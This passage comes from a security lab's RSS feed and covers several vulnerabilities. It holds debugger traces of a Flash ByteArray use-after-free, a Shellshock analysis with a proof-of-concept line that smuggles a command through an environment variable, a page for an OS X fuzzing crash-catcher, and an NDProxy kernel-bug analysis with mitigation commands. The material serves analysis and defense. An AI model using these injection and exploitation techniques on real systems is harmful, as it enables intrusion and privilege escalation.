+01238e79 e872fcffff      call    flashplayer_18_0_0_160!IAEModule_IAEKernel_UnloadModule+0x1c9510 (01238af0)
+0:000&gt; g
+Breakpoint 0 hit
+eax=42425000 ebx=42425000 ecx=00000000 edx=00000000 esi=01690058 edi=00042425
+eip=74d8182f esp=002fe70c ebp=002fe77e iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
+kernel32!VirtualAlloc:
+74d8182f ff250809d874    jmp     dword ptr [kernel32!_imp__VirtualAlloc (74d80908)] ds:002b:74d80908={KERNELBASE!VirtualAlloc (7548f002)}
+0:000&gt; t
+eax=42425000 ebx=42425000 ecx=00000000 edx=00000000 esi=01690058 edi=00042425
+eip=7548f002 esp=002fe70c ebp=002fe77e iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
+KERNELBASE!VirtualAlloc:
+7548f002 8bff            mov     edi,edi
+0:000&gt; gu
+eax=077a0000 ebx=42425000 ecx=3b7e0000 edx=000ae308 esi=01690058 edi=00042425
+eip=011af347 esp=002fe720 ebp=002fe77e iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+flashplayer_18_0_0_160!IAEModule_IAEKernel_UnloadModule+0x13fd67:
+011af347 c3              ret
+</pre>
+<p>Indeed index 0&#215;42424242 is too big for the 0&#215;01000000 array, it needs to allocate a larger block. This time the desired size is 0&#215;42425000 bytes and the block starts at address 0x077a0000.</p>
+<pre class="brush: asm; gutter: false; highlight: [1]; title: ; notranslate">
+0:000&gt; dd 077a0000
+077a0000  00000000 00000000 00000000 00000000
+077a0010  00000000 00000000 00000000 00000000
+077a0020  00000000 00000000 00000000 00000000
+077a0030  00000000 00000000 00000000 00000000
+077a0040  00000000 00000000 00000000 00000000
+077a0050  00000000 00000000 00000000 00000000
+077a0060  00000000 00000000 00000000 00000000
+077a0070  00000000 00000000 00000000 00000000
+</pre>
+<h2>Freeing the byte array.</h2>
+<p>Break just before the AvmCore_Integer() function is called. Set a new breakpoint on the VirtualFree() function. Observe it&#8217;s being hit before AvmCore_Integer() returns 0&#215;41414141.</p>
+<pre class="brush: asm; gutter: false; highlight: [6,7,9]; title: ; notranslate">
+Breakpoint 2 hit
+eax=49bc4242 ebx=04370ef9 ecx=032a94f1 edx=00000000 esi=49bc4242 edi=03223810
+eip=01238e85 esp=002fe898 ebp=002fe910 iopl=0         nv up ei pl nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
+flashplayer_18_0_0_160!IAEModule_IAEKernel_UnloadModule+0x1c98a5:
+01238e85 e8e672feff      call    flashplayer_18_0_0_160!IAEModule_IAEKernel_UnloadModule+0x1b0b90 (01220170)
+0:000&gt; bp kernel32!VirtualFree
+0:000&gt; g
+Breakpoint 4 hit
+eax=077a0000 ebx=74d81401 ecx=42425000 edx=077a0000 esi=01690058 edi=030f4078
+eip=74d81847 esp=002fe64c ebp=01690934 iopl=0         nv up ei pl nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
+kernel32!VirtualFree:
+74d81847 ff251009d874    jmp     dword ptr [kernel32!_imp__VirtualFree (74d80910)] ds:002b:74d80910={KERNELBASE!VirtualFree (7548ef47)}
+</pre>
+<p>This is because of ba.clear(). Indeed the memory at 0x077a0000 is not allocated anymore and Flash crashes.</p>
+<pre class="brush: asm; gutter: false; highlight: [1]; title: ; notranslate">
+0:000&gt; dd 077a0000
+077a0000  ???????? ???????? ???????? ????????
+077a0010  ???????? ???????? ???????? ????????
+077a0020  ???????? ???????? ???????? ????????
+077a0030  ???????? ???????? ???????? ????????
+077a0040  ???????? ???????? ???????? ????????
+077a0050  ???????? ???????? ???????? ????????
+077a0060  ???????? ???????? ???????? ????????
+077a0070  ???????? ???????? ???????? ????????
+0:000&gt; g
+(ef8.8a8): Access violation - code c0000005 (!!! second chance !!!)
+eax=41414141 ebx=04370ef9 ecx=0576ca07 edx=00000007 esi=49bc4242 edi=03223810
+eip=01238e8d esp=002fe89c ebp=002fe910 iopl=0         nv up ei pl nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
+flashplayer_18_0_0_160!IAEModule_IAEKernel_UnloadModule+0x1c98ad:
+01238e8d 8806            mov     byte ptr [esi],al          ds:002b:49bc4242=??
+</pre>
+<h2>Conclusion</h2>
+<p>In order to exploit this vulnerability, before the patch was applied, you had to overwrite the freed location with a vector object and then overwrite the length value of the vector object. This way it is possible to read and write anywhere in the process memory.</p>
+<p>To conclude, exploiting vulnerabilities is the most enjoyable part for most of us but understanding a bug is a mandatory step to go further. Not only will it train you to be better at reversing code but it will help you to write more stable exploits. It is sad in a way that for this bug most of the people just ripped of the original exploit to simply replace it with their own shellcodes.</p>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/cve-2015-5119-flash-bytearray-uaf-a-beginners-walkthrough/">CVE-2015-5119 Flash ByteArray UaF: A beginner&#8217;s walkthrough</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/cve-2015-5119-flash-bytearray-uaf-a-beginners-walkthrough/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>CVE-2014-6271 (Shellshock): The story of a permissive parser</title>
+		<link>https://labs.portcullis.co.uk/blog/cve-2014-6271-shellshock-the-story-of-a-permissive-parser/</link>
+		<comments>https://labs.portcullis.co.uk/blog/cve-2014-6271-shellshock-the-story-of-a-permissive-parser/#comments</comments>
+		<pubDate>Mon, 29 Sep 2014 15:23:08 +0000</pubDate>
+		<dc:creator><![CDATA[MTB]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[analysis]]></category>
+		<category><![CDATA[CVE-2014-6271]]></category>
+		<category><![CDATA[exploit]]></category>
+		<category><![CDATA[UNIX]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=4663</guid>
+		<description><![CDATA[<p>Some bugs are so simple and so elegant that you wonder how it is possible that no one has found them until now. Those are my favorites. They are simple, they do not involve memory corruption and most of the time they do not even need an advanced exploit code to abuse it. Stéphane Chazelas&#8217; [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/cve-2014-6271-shellshock-the-story-of-a-permissive-parser/">CVE-2014-6271 (Shellshock): The story of a permissive parser</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>Some bugs are so simple and so elegant that you wonder how it is possible that no one has found them until now. Those are my favorites. They are simple, they do not involve memory corruption and most of the time they do not even need an advanced exploit code to abuse it. Stéphane Chazelas&#8217; Bash bug is one of these bugs.<span id="more-4663"></span></p>
+<p>Note: Many other bugs related to Bash parser were discovered in the past few days such as CVE-2014-6277, CVE-2014-7169, CVE-2014-7186, CVE-2014-7187 and some others that have not yet been made public. This article is only about CVE-2014-6271.</p>
+<h2>Bash and functions</h2>
+<p>With <a title="Bash" href="http://www.gnu.org/software/bash/">Bash</a> it is possible to define functions. This is done as follows.</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ myfunction () { id; }
+$ myfunction
+uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(sambashare),113(libvirtd),114(lpadmin)
+</pre>
+<p>Bash also comes with a nifty feature. It allows functions to be exported and passed as an environment variable. This is done as follows:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+() { id; }
+</pre>
+<p>It is possible to pass this function to a new <em>bash</em> process.</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ myfunc='() { id; }' bash
+$ myfunc
+uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(sambashare),113(libvirtd),114(lpadmin)
+</pre>
+<p>Indeed, when the myfunc function is called, the id command is executed.</p>
+<h2>Installing a testing environment</h2>
+<p>First install Ubuntu 14.04.1 LTS available here: http://releases.ubuntu.com/14.04/.</p>
+<p>Make sure you have a vulnerable bash version <img src="https://labs.portcullis.co.uk/wp-includes/images/smilies/icon_smile.gif" alt=":-)" class="wp-smiley" /> </p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+# wget http://security.ubuntu.com/ubuntu/pool/main/b/bash/bash_4.3-6ubuntu1_amd64.deb
+# dpkg -i bash_4.3-6ubuntu1_amd64.deb
+</pre>
+<h2>Vulnerability</h2>
+<p>Let&#8217;s have a look at bash 4.2 source code to see how it works.</p>
+<p>First, in the general.h file, the STREQN() function is defined. It is a simple wrapper to the strncmp() function.</p>
+<pre class="brush: cpp; gutter: false; title: ; notranslate">
+/* String comparisons that possibly save a function call each. */
+#define STREQN(a, b, n) ((n == 0) ? (1) \
+				  : ((a)[0] == (b)[0] &amp;&amp; strncmp(a, b, n) == 0))
+</pre>
+<p>The way environment variables are handled is done in the initialize_shell_variables() function located in the variable.c file. It loops through each variables and if it finds an exported function, it defines it by running it. To catch if it is an exported function, it compares the string&#8217;s content with &#8220;() {&#8220;. If found, the complete string is evaluated and executed using the parse_and_execute() function.</p>
+<pre class="brush: cpp; highlight: [2,18,27]; title: ; notranslate">
+void
+initialize_shell_variables (env, privmode)
+     char **env;
+     int privmode;
+{
+  char *name, *string, *temp_string;
+  int c, char_index, string_index, string_length;
+  SHELL_VAR *temp_var;
+
+[...]
+
+  for (string_index = 0; string = env[string_index++]; )
+
+[...]
+
+      /* If exported function, define it now.  Don't import functions from
+	 the environment in privileged mode. */
+      if (privmode == 0 &amp;&amp; read_but_dont_execute == 0 &amp;&amp; STREQN (&quot;() {&quot;, string, 4))
+	{
+	  string_length = strlen (string);
+	  temp_string = (char *)xmalloc (3 + string_length + char_index);
+
+	  strcpy (temp_string, name);
+	  temp_string[char_index] = ' ';
+	  strcpy (temp_string + char_index + 1, string);
+
+	  parse_and_execute (temp_string, name, SEVAL_NONINT|SEVAL_NOHIST);
+
+	  /* Ancient backwards compatibility.  Old versions of bash exported
+	     functions like name()=() {...} */
+	  if (name[char_index - 1] == ')' &amp;&amp; name[char_index - 2] == '(')
+	    name[char_index - 2] = '&#92;&#48;';
+</pre>
+<p>As seen before, the <em>myfunc</em> bash function is not executed, it is only parsed and defined. But reading the source code, the whole string is parsed and executed, not only the function definition. If some code is inserted after the function definition, it should also be executed. This is easy to verify:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ myfunc='() { id;}; echo &quot;This should not be executed but it is.&quot;' bash -c &quot;echo legit shell&quot;
+This should not be executed but it is.
+legit shell
+</pre>
+<p>There may be multiple exploit vectors, mainly every time an environment variable can be passed to a new instance of Bash.<br />
+For instance:</p>
+<ul>
+<li>A CGI using HTTP_USER_AGENT variable</li>
+<li>OpenSSH on a restricted shell and the SSH_ORIGINAL_COMMAND variable</li>
+<li>dhclient with a custom domain-name</li>
+<li>Many more to find</li>
+</ul>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/cve-2014-6271-shellshock-the-story-of-a-permissive-parser/">CVE-2014-6271 (Shellshock): The story of a permissive parser</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/cve-2014-6271-shellshock-the-story-of-a-permissive-parser/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>Crash</title>
+		<link>https://labs.portcullis.co.uk/tools/crash/</link>
+		<comments>https://labs.portcullis.co.uk/tools/crash/#comments</comments>
+		<pubDate>Tue, 17 Dec 2013 16:08:23 +0000</pubDate>
+		<dc:creator><![CDATA[MTB]]></dc:creator>
+				<category><![CDATA[Tools]]></category>
+		<category><![CDATA[fuzzing]]></category>
+		<category><![CDATA[OSX]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=2672</guid>
+		<description><![CDATA[<p>The purpose of this tool is to catch crashes from OS X applications and print debugging information such as registers, disassembled code and a memory dump of the stack. The intended use is with the conjunction of an application fuzzer. Key features Catch OS X application&#8217;s crashes Display CPU registers Display disassembled code at the [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/tools/crash/">Crash</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>The purpose of this tool is to catch crashes from OS X applications and print debugging information such as registers, disassembled code and a memory dump of the stack. The intended use is with the conjunction of an application fuzzer.<span id="more-2672"></span></p>
+<h2>Key features</h2>
+<ul>
+<li>Catch OS X application&#8217;s crashes</li>
+<li>Display CPU registers</li>
+<li>Display disassembled code at the instruction that produced the crash</li>
+<li>Display a part of the stack</li>
+<li>Works transparently wether the application is 32 or 64 bits</li>
+</ul>
+<h2>Overview</h2>
+<p>The crash tool is a similar tool than the crash.exe tool from <a title="FileFuzz" href="http://packetstormsecurity.com/files/39626/FileFuzz.zip.html">FileFuzz</a> but for OS X. Used with an application fuzzer, it monitors the target application for exceptions.</p>
+<p>It is written in C and it works on both x86 and x86_64 architectures. It uses the excellent <a title="BeaEngine" href="http://www.beaengine.org/">BeaEngine</a> to disassemble the code.</p>
+<h2>Installation</h2>
+<p>In order to install the tool, you&#8217;ll need to generate a developer certificate.</p>
+<p>It can be done following those simple steps:</p>
+<ol>
+<li>Open Keychain Access.app</li>
+<li>Open menu Keychain Access/Certificate Assistant/Create a Certificate&#8230;</li>
+<li>Choose a name (codesigning-cert in the example).</li>
+<li>Set Identity Type to Self Signed Root.</li>
+<li>Set Certificate Type to Code Signing.</li>
+<li>Select the Let me override defaults.</li>
+<li>Click several times on Continue until you get to the Specify a Location For The Certificate screen, then set Keychain to System.</li>
+<li>Finally, using the contextual menu for the certificate, select Get Info, open the Trust item, and set Code Signing to Always Trust.</li>
+<li>You must quit Keychain Access application in order to use the certificate.</li>
+</ol>
+<p>Then run the following commands:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ make
+gcc -Iinclude/ -Wall -pedantic -framework Security -sectcreate __TEXT __info_plist ./Info.plist BeaEngine.o crash.c -o crash
+$ sudo make install
+Password:
+cp crash /usr/local/bin
+chgrp procmod /usr/local/bin/crash
+chmod 2755 /usr/local/bin/crash
+codesign -s codesigning-cert /usr/local/bin/crash
+$
+</pre>
+<h2>Usage</h2>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ ./crash
+Usage: crash [options] target arguments
+  -t seconds        timeout (default: 5).
+
+Using BeaEngine version 4.1-175.
+</pre>
+<h2>Examples</h2>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+# Define the amount of time the target program is allowed to live.
+$ sudo ./crash -t 2 /usr/local/bin/dummy64
+[+] PID: 31273. Executing: /usr/local/bin/dummy64
+PID: 31273 (0x7a29)
+[+] Timeout exceeded, exiting.
+$
+
+# Catching a crash from a 64 bits application.
+$ sudo ./crash -t 2 /usr/local/bin/dummy64 1 0
+[+] PID: 31282. Executing: /usr/local/bin/dummy64 1 0
+[+] Exception: unknown exception code 0xd.
+----------------------------------------------------------------------------------------------
+[ RAX: 4141414141414141  RBX: 0000000000000000  RCX: 4242424242424242  RDX: ffffffffffffffff ]
+[ RSI: 0000000000000000  RDI: 000000000000003c  RBP: 00007fff52359ef0  RSP: 00007fff52359eb0 ]
+[ R08: 0000000000000000  R09: 0000000000000000  R10: 0000000000000001  R11: 00007fff76360250 ]
+[ R12: 0000000000000000  R13: 0000000000000000  R14: 0000000000000000  R15: 0000000000000000 ]
+[     CS: 002b      FS: 0000      GS: 0000      RIP: 000000010d8a6ed4    o d I t s Z a p C   ]
+
+000000010d8a6ed4: mov        qword [rax], rcx
+000000010d8a6ed7: mov         [rbp-0x18], 0x00000000
+000000010d8a6ede: mov        eax,  [rbp-0x18]
+000000010d8a6ee1: mov         [rbp-0x14], eax
+000000010d8a6ee4: mov        eax,  [rbp-0x14]
+000000010d8a6ee7: add        rsp, 0x40
+
+Stack:
+00007fff52359eb0: 00007fff52359f38  8.5R....
+00007fff52359eb0: 0000000000000000  ........
+00007fff52359eb0: 0000000000000000  ........
+00007fff52359eb0: 4141414141414141  AAAAAAAA
+00007fff52359eb0: 0000000000000001  ........
+00007fff52359eb0: 0000000000000000  ........
+00007fff52359eb0: 00007fff52359f10  ..5R....
+00007fff52359eb0: 000000036d4a705e  ^pJm....
+----------------------------------------------------------------------------------------------
+
+# Catching a crash from a 32 bits application.
+$ sudo ./crash -t 2 /usr/local/bin/dummy32 1 0
+[+] PID: 31285. Executing: /usr/local/bin/dummy32 1 0
+[+] Exception: KERN_INVALID_ADDRESS.
+--------------------------------------------------------------
+[ EAX: 00000000  EBX: bff6df54  ECX: bff6de4c  EDX: 99ce68e6 ]
+[ ESI: 00000000  EDI: 00000000  EBP: bff6df08  ESP: bff6ded0 ]
+[ ES: 0023  CS: 001b  SS: 0023  DS: 0023  FS: 0000  GS: 000f ]
+[ EIP: 00093f23                            o d I t S Z a P C ]
+
+00093f23: mov         [0x41414141], 0x42424242
+00093f2d: mov         [ebp-0x10], 0x00000000
+00093f34: mov        eax,  [ebp-0x10]
+00093f37: mov         [ebp-0x0C], eax
+00093f3a: mov        eax,  [ebp-0x0C]
+00093f3d: add        esp, 0x38
+
+Stack:
+bff6ded0: 00000000  ....
+bff6ded0: 0000000a  ....
+bff6ded0: 8fe925ec  .%..
+bff6ded0: 00093e5b  [&gt;..
+bff6ded0: 00000001  ....
+bff6ded0: bff6df50  P...
+bff6ded0: bff6df40  @...
+bff6ded0: bff6df38  8...
+--------------------------------------------------------------
+</pre>
+<div class="wpfilebase-file-default" onclick="if('undefined' == typeof event.target.href) document.getElementById('wpfb-file-link-1').click();">
+  <div class="icon"><a href="https://labs.portcullis.co.uk/download/crash-1.0.tar.bz2" target="_blank" title="Download Crash-1.0 Tar"><img align="middle" src="https://labs.portcullis.co.uk/wp-includes/images/crystal/archive.png" alt="Crash-1.0 Tar" /></a></div>
+  <div class="filetitle">
+    <a href="https://labs.portcullis.co.uk/download/crash-1.0.tar.bz2" title="Download crash-1.0.tar.bz2" target="_blank" id="wpfb-file-link-1">crash-1.0.tar.bz2</a>
+    
+    <br />
+    December 17, 2013<br />
+    
+  </div>
+  <div class="info">
+    253.3 KiB<br />
+    MD5 hash: 53f1eb77dc8d1eeee38bc5da6cca25be <br />
+    <a href="#" onclick="return wpfilebase_filedetails(1);">Details</a>
+  </div>
+  <div class="details" id="wpfilebase-filedetails1" style="display: none;">
+  
+  <table border="0">
+   
+   
+   
+   
+   
+   
+   <tr><td><strong>Date:</strong></td><td>December 17, 2013</td></tr>
+  </table>
+  </div>
+ <div style="clear: both;"></div>
+</div>
+<p>The post <a href="https://labs.portcullis.co.uk/tools/crash/">Crash</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/tools/crash/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>CVE-2013-5065: NDProxy array indexing error unpatched vulnerability</title>
+		<link>https://labs.portcullis.co.uk/blog/cve-2013-5065-ndproxy-array-indexing-error-unpatched-vulnerability/</link>
+		<comments>https://labs.portcullis.co.uk/blog/cve-2013-5065-ndproxy-array-indexing-error-unpatched-vulnerability/#comments</comments>
+		<pubDate>Tue, 10 Dec 2013 06:02:00 +0000</pubDate>
+		<dc:creator><![CDATA[MTB]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[analysis]]></category>
+		<category><![CDATA[CVE-2013-5065]]></category>
+		<category><![CDATA[exploit]]></category>
+		<category><![CDATA[Windows]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=2478</guid>
+		<description><![CDATA[<p>The purpose of this document is to present a technical report of the CVE-2013-5065 vulnerability. A few days ago, FireEye identified a 0 day kernel exploit embedded within a PDF document actively used in the wild. The vulnerability itself is present in the NDProxy kernel driver. Whilst this is present in all versions of Windows, [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/cve-2013-5065-ndproxy-array-indexing-error-unpatched-vulnerability/">CVE-2013-5065: NDProxy array indexing error unpatched vulnerability</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>The purpose of this document is to present a technical report of the <a title="CVE-2013-5065" href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-5065">CVE-2013-5065</a> vulnerability. A few days ago, FireEye identified a 0 day kernel exploit embedded within a PDF document actively used in the wild. The vulnerability itself is present in the NDProxy kernel driver. Whilst this is present in all versions of Windows, the vulnerability itself is only present in Windows 2003 and XP. The NDProxy driver is responsible for interfacing NDISWAN and CoNDIS WAN drivers to the TAPI services.<span id="more-2478"></span></p>
+<h2>Binary Information</h2>
+<table>
+<tbody>
+<tr>
+<td>OS:</td>
+<td>Windows XP SP3</td>
+</tr>
+<tr>
+<td>Name:</td>
+<td>ndproxy.sys</td>
+</tr>
+<tr>
+<td>Base address:</td>
+<td>0xF874A000</td>
+</tr>
+<tr>
+<td>File version:</td>
+<td>5.1.2600.6048</td>
+</tr>
+<tr>
+<td>Default path:</td>
+<td>C:\Windows\System32\drivers\ndproxy.sys</td>
+</tr>
+</tbody>
+</table>
+<h2>Vulnerability</h2>
+<p>The vulnerability itself is present in the PxIODispatch() function that is reachable from a simple IO Control.</p>
+<pre class="brush: cpp; gutter: false; title: ; notranslate">
+DeviceIoControl(hDev, 0x8fff23cc, buffer, sizeof(buffer), buffer, sizeof(buffer), &amp;dwRet, 0);
+</pre>
+<p>The function works as follows:</p>
+<ul>
+<li>Reads an index value using the IO control message.</li>
+<li>Calls a function from a function array using the received index.</li>
+</ul>
+<pre class="brush: asm; gutter: false; highlight: [20,26,28,34,40,41,42,44,49,51,53,59,60,74,76]; title: ; notranslate">
+.text:F874CE92 PxIODispatch
+.text:F874CE92
+.text:F874CE92 var_8           = dword ptr -8
+.text:F874CE92 var_4           = dword ptr -4
+.text:F874CE92 arg_0           = dword ptr  8
+.text:F874CE92 LockState       = _LOCK_STATE ptr  0Ch
+.text:F874CE92
+.text:F874CE92                 mov     edi, edi
+.text:F874CE94                 push    ebp
+.text:F874CE95                 mov     ebp, esp
+.text:F874CE97                 push    ecx
+.text:F874CE98                 push    ecx
+.text:F874CE99                 and     [ebp+var_4], 0
+.text:F874CE9D                 push    ebx
+.text:F874CE9E                 mov     ebx, dword ptr [ebp+LockState.LockState]
+.text:F874CEA1                 mov     eax, [ebx+60h]
+.text:F874CEA4                 cmp     byte ptr [eax], 0Eh
+.text:F874CEA7                 mov     ecx, [eax+8]
+.text:F874CEAA                 push    esi
+.text:F874CEAB                 mov     esi, [ebx+0Ch]                              // Data sent from the IO control.
+.text:F874CEAE                 mov     dword ptr [ebp+LockState.LockState], ecx
+.text:F874CEB1                 mov     ecx, [eax+4]
+
+...
+
+.text:F874CEEE                 cmp     eax, 8FFF23C8h                              // Checking the IO Control code.
+.text:F874CEF3                 jz      loc_F874D07C
+.text:F874CEF9                 cmp     eax, 8FFF23CCh                              // two possibilities.
+.text:F874CEFE                 jz      loc_F874D07C
+
+...
+
+.text:F874D07C loc_F874D07C:                          
+.text:F874D07C                 mov     edi, dword ptr [ebp+LockState.LockState]    // EDI = 0x54.
+.text:F874D07F                 push    24h
+.text:F874D081                 pop     edx
+
+...
+
+.text:F874D092                 mov     eax, [esi+14h]                              // Data sent from the IO control at 0x14.
+.text:F874D095                 sub     eax, 7030101h                               // Compute an index using the given value.
+.text:F874D09A                 cmp     eax, edx                                    
+.text:F874D09C                 mov     [ebp+var_4], edx
+.text:F874D09F                 jbe     short loc_F874D0AD                          // It must be between 0 and 0x24 included!
+
+...
+
+.text:F874D0AD loc_F874D0AD:                         
+.text:F874D0AD                 mov     ecx, [esi+1Ch]                              // Data sent from the IO control at 0x1c.
+.text:F874D0B0                 lea     eax, [eax+eax*2]                            
+.text:F874D0B3                 shl     eax, 2                                      // Index * 12.
+.text:F874D0B6                 cmp     ecx, dword_F8752184[eax]
+.text:F874D0BC                 mov     dword ptr [ebp+LockState.LockState], eax    // Save the index.
+.text:F874D0BF                 jnb     short loc_F874D0CD ; 0x54 - 0x20
+
+...
+
+.text:F874D0CD loc_F874D0CD:                         
+.text:F874D0CD                 add     edi, 0FFFFFFE0h                             // 0x54 - 0x20.
+.text:F874D0D0                 cmp     ecx, edi                                    // The value at 0x1c must be lower than 0x34.
+.text:F874D0D2                 ja      short loc_F874D0C1
+
+...
+
+.text:F874D11B loc_F874D11B:                          
+.text:F874D11B                 mov     eax, dword_F87528B4
+.text:F874D120                 mov     [esi+0Ch], eax
+.text:F874D123                 mov     [esi+8], ebx
+.text:F874D126                 mov     dl, byte_F87528C0 
+.text:F874D12C                 mov     ecx, edi       
+.text:F874D12E                 call    ds:__imp_@KfReleaseSpinLock@8 
+.text:F874D134                 mov     eax, [ebx+60h]
+.text:F874D137                 or      byte ptr [eax+3], 1
+.text:F874D13B                 mov     eax, dword ptr [ebp+LockState.LockState]    // Saved index.
+.text:F874D13E                 push    esi
+.text:F874D13F                 call    off_F8752188[eax]                           // Call the function at index.
+</pre>
+<p>The function table can be seen from the memory, from the first entry to the last one.</p>
+<pre class="brush: asm; gutter: false; highlight: [1,38]; title: ; notranslate">
+kd&gt; .for (r $t0=0; @$t0&lt;=0x24; r $t0=@$t0+1) { dd f8752188+($t0*0xc) L3 }
+f8752188  f874d38a 07030102 00000010
+f8752194  f874e4ce 07030103 00000008
+f87521a0  f874f994 07030104 00000008
+f87521ac  f874e824 07030105 000000c0
+f87521b8  f874d398 07030106 0000001c
+f87521c4  f874d398 07030107 00000018
+f87521d0  f874d398 07030108 00000010
+f87521dc  f874d38a 07030109 00000010
+f87521e8  f874e89c 0703010a 000000f4
+f87521f4  f874fac6 0703010b 00000018
+f8752200  f874fcae 0703010c 0000004c
+f875220c  f874d38a 0703010d 0000000c
+f8752218  f874e944 0703010e 00000160
+f8752224  f874e9b2 0703010f 0000002c
+f8752230  f874eca6 07030110 00000130
+f875223c  f874f5c4 07030111 00000028
+f8752248  f874d38a 07030112 00000018
+f8752254  f874d38a 07030113 00000034
+f8752260  f874e58e 07030114 00000054
+f875226c  f874fd12 07030115 000000d0
+f8752278  f874f240 07030116 00000014
+f8752284  f874d370 07030117 00000024
+f8752290  f874ff3a 07030118 00000010
+f875229c  f874d398 07030119 00000004
+f87522a8  f874d398 0703011a 00000008
+f87522b4  f874d38a 0703011b 0000000c
+f87522c0  f874d398 0703011c 00000010
+f87522cc  f874d38a 0703011d 0000000c
+f87522d8  f874ed7c 0703011e 00000028
+f87522e4  f874d38a 0703011f 0000000c
+f87522f0  f874fd8c 07030120 00000018
+f87522fc  f874d38a 07030121 0000000c
+f8752308  f874edea 07030122 00000010
+f8752314  f874d38a 07030123 00000034
+f8752320  f874ee78 07030124 00000008
+f875232c  f874f05e 00000030 00000034
+f8752338  00000038 0000003c 00000040
+</pre>
+<p>The last function in the array (index 0&#215;24) points to address 0&#215;00000038. Indeed, if the index submitted through the IO Control is 0&#215;24, this address is called.</p>
+<pre class="brush: asm; gutter: false; highlight: [5]; title: ; notranslate">
+Access violation - code c0000005 (!!! second chance !!!)
+eax=000001b0 ebx=82263a78 ecx=00000000 edx=00000000 esi=81ffa720 edi=f87528bc
+eip=00000038 esp=b2419c18 ebp=b2419c34 iopl=0         nv up ei pl nz na po nc
+cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010202
+00000038 ??              ???
+</pre>
+<h2>Exploitation</h2>
+<p>This vulnerability is present in Windows XP and Windows 2003. Based on tests, both versions can be leveraged into code execution.</p>
+<p>Exploitation of this vulnerability is trivial since it is possible to map address 0&#215;00000001 on those operating systems. Therefore the attacker just needs to insert his kernel shellcode at address 0&#215;00000038 to get it executed. Writing a full exploit for those operating systems is left as an exercise to the reader.</p>
+<h2>Conclusion</h2>
+<p>This vulnerability has been seen to be actively used in the wild. As seen in the present blog post, exploitation of this vulnerability is easy and public exploits have already been published. It is recommended to disable NDProxy by running the following commands and rebooting the system while Microsoft issues a fix.</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+&gt; sc stop ndproxy
+&gt; reg add HKLM\System\CurrentControlSet\Services\ndproxy /v ImagePath /t REG_EXPAND_SZ /d system32\drivers\null.sys /f
+</pre>
+<p>Disabling NDProxy however can cause side effects including issues in Remote Access Service (RAS), dial-up networking and the interruption of virtual private networking (VPN).</p>
+<h2>References</h2>
+<ul>
+<li>Microsoft&#8217;s advisory: <a title="Microsoft Security Advisory" href="http://technet.microsoft.com/en-us/security/advisory/2914486">http://technet.microsoft.com/en-us/security/advisory/2914486</a></li>
+<li>FireEye blog post: <a title="FireEye blog post" href="http://www.fireeye.com/blog/technical/cyber-exploits/2013/11/ms-windows-local-privilege-escalation-zero-day-in-the-wild.html">http://www.fireeye.com/blog/technical/cyber-exploits/2013/11/ms-windows-local-privilege-escalation-zero-day-in-the-wild.html</a></li>
+</ul>
+<p>Editor’s note: We&#8217;ve corrected a slight ambiguity around which versions of Windows are affected, the initial post did not clearly differentiate between versions of Windows that had NDProxy and those that are actually vulnerable.</p>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/cve-2013-5065-ndproxy-array-indexing-error-unpatched-vulnerability/">CVE-2013-5065: NDProxy array indexing error unpatched vulnerability</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
